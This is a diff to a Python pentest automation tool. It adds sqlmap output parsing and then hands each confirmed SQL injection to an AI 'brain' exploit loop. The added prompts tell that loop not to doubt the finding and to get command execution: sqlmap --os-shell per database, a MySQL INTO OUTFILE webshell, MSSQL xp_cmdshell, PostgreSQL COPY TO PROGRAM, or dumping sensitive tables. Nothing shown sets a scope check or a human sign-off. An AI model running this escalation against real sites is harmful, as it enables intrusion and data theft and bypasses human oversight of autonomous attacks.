@@ -1190,6 +1190,7 @@ def run_cmd(
     watch_phase: str = None,
     watch_interval: int = WATCHDOG_INTERVAL,
     watch_max_stale: int = WATCHDOG_MAX_IDLE,
+    pty_stdin: bool = False,
 ) -> tuple[bool, str]:
     try:
         if watch_file is not None:
@@ -1200,7 +1201,9 @@ def run_cmd(
 
             # Fork-safe launch: posix_spawn avoids macOS Network.framework atfork
             # SIGSEGV that killed SQLMAP/CVE HUNT/REPORTS at 0.0s (see _PosixSpawnProc).
-            proc = _fork_safe_spawn(cmd, env=env, cwd=cwd, capture=True, shell=True)
+            # pty_stdin gives the child a tty on fd 0 (sqlmap -r needs it; see below).
+            proc = _fork_safe_spawn(cmd, env=env, cwd=cwd, capture=True, shell=True,
+                                    pty_stdin=pty_stdin)
             log("info", f"START {label}: PID {proc.pid} @ {started_label}")
             log("info", f"Command: {cmd}")
 
@@ -1277,7 +1280,8 @@ def run_cmd(
             log(end_level, f"END {label}: PID {proc.pid} rc={rc} duration={duration:.1f}s{timeout_note}")
             return rc == 0, (stdout or "") + (stderr or "")
 
-        proc = _fork_safe_spawn(cmd, env=_tool_env(), cwd=cwd, capture=True, shell=True)
+        proc = _fork_safe_spawn(cmd, env=_tool_env(), cwd=cwd, capture=True, shell=True,
+                                pty_stdin=pty_stdin)
         try:
             stdout, _ = proc.communicate(timeout=timeout)
         except subprocess.TimeoutExpired:
@@ -6289,6 +6293,109 @@ def run_sqlmap_targeted(domain: str, cookies: str = "") -> bool:
     return True
 
 
+# sqlmap CONFIRMED-injection markers. sqlmap's confirmation output — ESPECIALLY when
+# it resumes an injection point from a stored session — does NOT contain the word
+# "injectable"; it prints "Parameter:", "Type:", "Title:", "Payload:" blocks, "the
+# back-end DBMS is X", and enumerated databases/tables. The old token grep missed all
+# of that and wrongly reported "no injections detected" while sqlmap had dumped tables.
+_SQLMAP_INJ_TYPES = (
+    "boolean-based blind", "time-based blind", "stacked queries",
+    "union query", "error-based", "inline query",
+)
+
+
+def _parse_sqlmap_confirmation(out: str) -> dict:
+    """Extract confirmed-injection facts from sqlmap stdout (fresh OR resumed run)."""
+    import re as _re
+    res = {"confirmed": False, "params": [], "dbms": "", "types": [],
+           "payloads": [], "tables": []}
+    if not out:
+        return res
+    low = out.lower()
+    if ("sqlmap identified the following injection point" in low
+            or "sqlmap resumed the following injection point" in low
+            or "the back-end dbms is" in low):
+        res["confirmed"] = True
+
+    for ln in out.splitlines():
+        s = ln.strip()
+        sl = s.lower()
+        m = _re.match(r"Parameter:\s*(.+?)\s*(?:\(|$)", s)
+        if m:
+            res["params"].append(m.group(1).strip())
+            res["confirmed"] = True
+        if sl.startswith("type:"):
+            t = s.split(":", 1)[1].strip()
+            res["types"].append(t)
+            if any(k in t.lower() for k in _SQLMAP_INJ_TYPES):
+                res["confirmed"] = True
+        if sl.startswith("payload:"):
+            res["payloads"].append(s.split(":", 1)[1].strip())
+        if sl.startswith("back-end dbms:"):
+            res["dbms"] = s.split(":", 1)[1].strip() or res["dbms"]
+        if not res["dbms"]:
+            m2 = _re.search(r"the back-end dbms is\s+([A-Za-z0-9 ._-]+)", s, _re.I)
+            if m2:
+                res["dbms"] = m2.group(1).strip()
+        # Affirmative-only: "does NOT seem to be injectable" / "might be injectable"
+        # (heuristic) must NOT confirm. Structural markers above are the reliable
+        # signal; this just catches the fresh-run "parameter 'x' is vulnerable" wording.
+        if "is vulnerable" in sl and "not vulnerable" not in sl:
+            res["confirmed"] = True
+
+    # Enumerated tables rendered as "| name |" inside a Database: block.
+    if "Database:" in out:
+        for ln in out.splitlines():
+            m = _re.match(r"\|\s*([A-Za-z0-9_]+)\s*\|$", ln.strip())
+            if m and m.group(1).lower() not in ("table", "tables"):
+                res["tables"].append(m.group(1))
+
+    for k in ("params", "types", "payloads", "tables"):
+        res[k] = list(dict.fromkeys(res[k]))
+    return res
+
+
+def _sqlmap_evidence_block(conf: dict) -> str:
+    """Compact, grounded evidence string handed to the brain's exploit loop."""
+    parts = [
+        "sqlmap CONFIRMED SQL injection (do not re-doubt it; demonstrate impact).",
+        f"DBMS: {conf.get('dbms') or 'unknown'}",
+        f"Parameter(s): {', '.join(conf.get('params') or []) or 'n/a'}",
+        f"Technique(s): {', '.join(conf.get('types') or []) or 'n/a'}",
+    ]
+    if conf.get("payloads"):
+        parts.append("Confirmed payloads:\n" + "\n".join(conf["payloads"][:6]))
+    if conf.get("tables"):
+        parts.append(f"Already enumerated {len(conf['tables'])} tables: "
+                     + ", ".join(conf["tables"][:15]))
+    return "\n".join(parts)
+
+
+def _sqli_rce_hints(conf: dict, req_abs: str, target_url: str) -> str:
+    """DBMS-scoped SQLi->RCE guidance for the exploit loop. Always reuse the -r file."""
+    dbms = (conf.get("dbms") or "").lower()
+    lines = [
+        f"Reuse the EXACT request via sqlmap's -r file (headers/cookies/body preserved): {req_abs}",
+        "Drive sqlmap with --batch -v0 and the SAME -r file; do not hand-craft a new request.",
+        "Data access is already proven (tables enumerated); now attempt command/code execution.",
+    ]
+    if "postgresql" in dbms:
+        lines.append(f"PostgreSQL + stacked queries -> RCE: sqlmap -r {req_abs} --batch "
+                     "--dbms=postgresql --os-shell -v0 (COPY/lo_export); or --sql-query "
+                     '"SELECT version()" to prove stacked execution.')
+    elif "mysql" in dbms:
+        lines.append(f"MySQL -> sqlmap -r {req_abs} --batch --dbms=mysql --os-shell -v0 "
+                     "(INTO OUTFILE webshell if FILE priv + writable webroot).")
+    elif "microsoft sql server" in dbms or "mssql" in dbms:
+        lines.append(f"MSSQL -> sqlmap -r {req_abs} --batch --dbms=mssql --os-shell -v0 (xp_cmdshell).")
+    else:
+        lines.append(f"Try sqlmap -r {req_abs} --batch --os-shell -v0 and --sql-shell to gauge impact.")
+    lines.append("If OS exec is impossible, prove max impact via --dump of the most sensitive "
+                 "table, but REDACT actual row values in the PoC.")
+    lines.append("Output `CONFIRMED: <impact>` then `EXPLOIT_DONE` once impact is proven.")
+    return "\n".join(lines)
+
+
 # ── NEW: sqlmap via raw request file (--request-file) ───────────────────────────
 def run_sqlmap_request_file(req_file: str, domain: str | None = None,
                              level: int = 5, risk: int = 3,
@@ -6374,56 +6481,85 @@ def run_sqlmap_request_file(req_file: str, domain: str | None = None,
     )
 
     log("info", f"Running: {cmd}")
-    ok, out = run_cmd(cmd, timeout=2400, watch_file=sqli_dir, watch_phase="SQLMAP-RF")
+    # pty_stdin=True is REQUIRED here: sqlmap's `-r` (request-file) mode silently
+    # falls into "using 'STDIN' for parsing targets list" — testing NOTHING — when
+    # stdin is not a tty (nohup, cron, agent.py, any subprocess). sqlmap's
+    # _setStdinPipeTargets() only early-returns on conf.url, never conf.requestFile.
+    # A pty on the child's fd 0 makes os.isatty(0) True so `-r` is honoured.
+    ok, out = run_cmd(cmd, timeout=2400, watch_file=sqli_dir, watch_phase="SQLMAP-RF",
+                      pty_stdin=True)
     print(out[-4000:] if len(out) > 4000 else out)
 
-    # ── Parse results ────────────────────────────────────────────────────────
-    injections = 0
-    vuln_params: list[str] = []
-
+    # ── Parse results: robust CONFIRMED-injection detection ──────────────────
+    conf = _parse_sqlmap_confirmation(out)
+    # results.txt CSV is an extra signal on a fresh (non-resumed) run.
     if os.path.isfile(sqli_out):
         for ln in open(sqli_out):
-            if "injectable" in ln.lower() or "injection" in ln.lower():
-                injections += 1
-                vuln_params.append(ln.strip())
+            if "injectable" in ln.lower() or "injection point" in ln.lower():
+                conf["confirmed"] = True
 
-    # Also scan stdout for "Parameter: X ... injectable"
-    param_pat = _re.compile(r"Parameter:\s+(\S+)\s", _re.IGNORECASE)
-    for ln in out.splitlines():
-        if "injectable" in ln.lower() or "is vulnerable" in ln.lower():
-            m = param_pat.search(ln)
-            if m:
-                vuln_params.append(m.group(0).strip())
+    target_url = path_from_file if path_from_file.lower().startswith("http") \
+        else f"https://{effective_domain}{path_from_file}"
 
-    vuln_params = list(dict.fromkeys(vuln_params))  # dedup
-
-    if vuln_params or injections:
-        log("crit", f"INJECTABLE: {len(vuln_params or [injections])} parameter(s) → {sqli_dir}")
-        for vp in vuln_params[:5]:
-            log("crit", f"  ↳ {vp}")
-        # Write finding summary
+    if conf["confirmed"]:
+        log("crit", f"INJECTABLE: {effective_domain} {method_from_file} {path_from_file}")
+        if conf["dbms"]:
+            log("crit", f"  ↳ DBMS: {conf['dbms']}")
+        if conf["types"]:
+            log("crit", f"  ↳ Technique(s): {', '.join(conf['types'])}")
+        if conf["params"]:
+            log("crit", f"  ↳ Parameter(s): {', '.join(conf['params'])}")
+        if conf["tables"]:
+            shown = ", ".join(conf["tables"][:8])
+            more = f" (+{len(conf['tables']) - 8} more)" if len(conf["tables"]) > 8 else ""
+            log("crit", f"  ↳ {len(conf['tables'])} table(s): {shown}{more}")
         summary_f = os.path.join(sqli_dir, "INJECTABLE_PARAMS.txt")
         with open(summary_f, "w") as sf:
-            sf.write(f"Target:  {effective_domain}\n")
-            sf.write(f"Method:  {method_from_file}\n")
-            sf.write(f"Path:    {path_from_file}\n")
-            sf.write(f"Request: {req_abs}\n\n")
-            sf.write("INJECTABLE PARAMETERS:\n")
-            sf.write("\n".join(vuln_params) + "\n")
+            sf.write(f"Target:    {effective_domain}\n")
+            sf.write(f"URL:       {target_url}\n")
+            sf.write(f"Method:    {method_from_file}\n")
+            sf.write(f"Request:   {req_abs}\n")
+            sf.write(f"DBMS:      {conf['dbms'] or 'unknown'}\n")
+            sf.write(f"Technique: {', '.join(conf['types']) or 'n/a'}\n")
+            sf.write(f"Param(s):  {', '.join(conf['params']) or 'n/a'}\n\n")
+            if conf["payloads"]:
+                sf.write("PAYLOADS:\n" + "\n".join(conf["payloads"]) + "\n\n")
+            if conf["tables"]:
+                sf.write(f"ENUMERATED TABLES ({len(conf['tables'])}):\n"
+                         + "\n".join(conf["tables"]) + "\n")
         log("crit", f"Summary → {summary_f}")
     else:
-        log("ok", f"sqlmap (request-file) complete — no injections detected → {sqli_dir}")
+        log("ok", f"sqlmap (request-file) complete — no injection confirmed → {sqli_dir}")
 
+    # End-of-phase narration (honest assessment only — does NOT escalate).
     if _brain and _brain.enabled:
         _brain_phase_complete(
             "SQLMAP-RF",
             ok,
-            detail=f"target={effective_domain} method={method_from_file} "
-                   f"path={path_from_file} injections={injections}",
+            detail=(f"target={effective_domain} method={method_from_file} "
+                    f"path={path_from_file} confirmed={conf['confirmed']} "
+                    f"dbms={conf['dbms'] or 'n/a'} techniques={';'.join(conf['types']) or 'n/a'}"),
             artifacts={"sqlmap_reqfile": sqli_dir},
         )
 
-    return bool(vuln_params or injections)
+    # ── SQLi→RCE escalation ──────────────────────────────────────────────────
+    # Hand the CONFIRMED injection to the active exploit loop (run_command-driven)
+    # so the brain demonstrates real impact (PostgreSQL stacked queries -> COPY ...
+    # TO PROGRAM / --os-shell). This is the path that actually exercises run_command;
+    # the narration hook above only assesses. brain.run_command auto-allocates a pty
+    # for any `sqlmap -r` it issues, so the escalation's sqlmap calls don't re-hit
+    # the non-tty STDIN bug.
+    if conf["confirmed"] and _brain and _brain.enabled:
+        evidence = _sqlmap_evidence_block(conf)
+        extra = _sqli_rce_hints(conf, req_abs, target_url)
+        log("phase", f"SQLi→RCE escalation (brain exploit loop) → {target_url}")
+        try:
+            _brain.exploit_finding(target_url, "SQL Injection", evidence,
+                                   findings_dir=findings_dir, extra_context=extra)
+        except Exception as e:
+            log("warn", f"brain exploit loop error: {e}")
+
+    return bool(conf["confirmed"])
 
 
 # ── POST-aware katana crawl + arjun POST param discovery ────────────────────────
